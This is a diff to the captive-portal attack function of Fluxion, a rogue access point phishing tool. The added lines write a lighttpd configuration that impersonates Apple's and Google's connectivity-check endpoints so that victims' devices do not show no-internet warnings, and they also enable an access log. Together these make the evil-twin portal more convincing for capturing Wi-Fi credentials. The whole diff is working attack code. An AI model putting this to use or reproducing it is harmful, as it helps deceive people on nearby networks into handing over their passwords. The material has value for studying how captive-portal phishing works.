@@ -324,6 +324,10 @@ function captive_portal_set_attack() {
 		chmod u+x "$FLUXIONWorkspacePath/captive_portal/$authenticatorFile"
 	done
 
+	# Add the files for captive portal internet connectivity checks.
+	cp -r "$FLUXIONPath/attacks/Captive Portal/lib/connectivity responses/" \
+		"$FLUXIONWorkspacePath/captive_portal/connectivity_responses"
+
 	# Generate the dhcpd configuration file, which is
 	# used to provide DHCP service to APRogue clients.
 	echo "\
@@ -357,6 +361,8 @@ server.modules = (
 	\"mod_redirect\",
 	\"mod_rewrite\"
 )
+
+accesslog.filename = \"$FLUXIONWorkspacePath/lighttpd.log\"
 
 fastcgi.server = (
 	\".php\" => (
@@ -399,13 +405,40 @@ index-file.names = (
 )
 
 \$SERVER[\"socket\"] == \":443\" {
-	ssl.engine                  = \"enable\"
-	ssl.pemfile                 = \"$FLUXIONWorkspacePath/server.pem\"
+	ssl.engine = \"enable\"
+	ssl.pemfile = \"$FLUXIONWorkspacePath/server.pem\"
 }
 
-#Redirect www.domain.com to domain.com
-\$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
-    url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
+# Redirect www.domain.com to domain.com
+#\$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
+#	url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
+#}
+
+# The following will emulate Apple's and Google's internet connectivity checks.
+# This should help with no-internet-connection warnings in some devices.
+\$HTTP[\"host\"] == \"captive.apple.com\" { # Respond with Apple's captive response.
+	server.document-root = \"$FLUXIONWorkspacePath/captive_portal/connectivity_responses/Apple/\"
+}
+
+# Consolidate the clusterfuck below, I'm sleepy right now, can't regex right...
+\$HTTP[\"host\"] == \"www.google.com\" { # Respond with Google's captive response.
+	server.document-root = \"$FLUXIONWorkspacePath/captive_portal/connectivity_responses/Google/\"
+	url.rewrite-once = ( \"^/generate_204\$\" => \"generate_204.php\" )
+}
+
+\$HTTP[\"host\"] == \"clients3.google.com\" { # Respond with Google's alternative captive response.
+	server.document-root = \"$FLUXIONWorkspacePath/captive_portal/connectivity_responses/Google/\"
+	url.rewrite-once = ( \"^/generate_204\$\" => \"generate_204.php\" )
+}
+
+\$HTTP[\"host\"] == \"connectivitycheck.gstatic.com\" { # Respond with Google's alternative captive response.
+	server.document-root = \"$FLUXIONWorkspacePath/captive_portal/connectivity_responses/Google/\"
+	url.rewrite-once = ( \"^/generate_204\$\" => \"generate_204.php\" )
+}
+
+\$HTTP[\"host\"] == \"connectivitycheck.android.com\" { # Respond with Google's alternative captive response.
+	server.document-root = \"$FLUXIONWorkspacePath/captive_portal/connectivity_responses/Google/\"
+	url.rewrite-once = ( \"^/generate_204\$\" => \"generate_204.php\" )
 }
 " > "$FLUXIONWorkspacePath/lighttpd.conf"
 
